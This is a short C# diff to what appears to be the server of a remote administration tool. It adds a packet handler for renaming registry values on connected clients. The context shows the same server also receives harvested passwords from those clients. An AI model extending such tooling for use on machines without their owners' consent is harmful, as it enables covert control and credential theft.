@@ -90,6 +90,10 @@ namespace xServer.Core.Packets
             {
                 CommandHandler.HandleDeleteRegistryValue((ClientPackets.GetDeleteRegistryValueResponse)packet, client);
             }
+            else if (type == typeof(ClientPackets.GetRenameRegistryValueResponse))
+            {
+                CommandHandler.HandleRenameRegistryValue((ClientPackets.GetRenameRegistryValueResponse)packet, client);
+            }
             else if (type == typeof(ClientPackets.GetPasswordsResponse))
             {
                 CommandHandler.HandleGetPasswordsResponse(client, (ClientPackets.GetPasswordsResponse)packet);
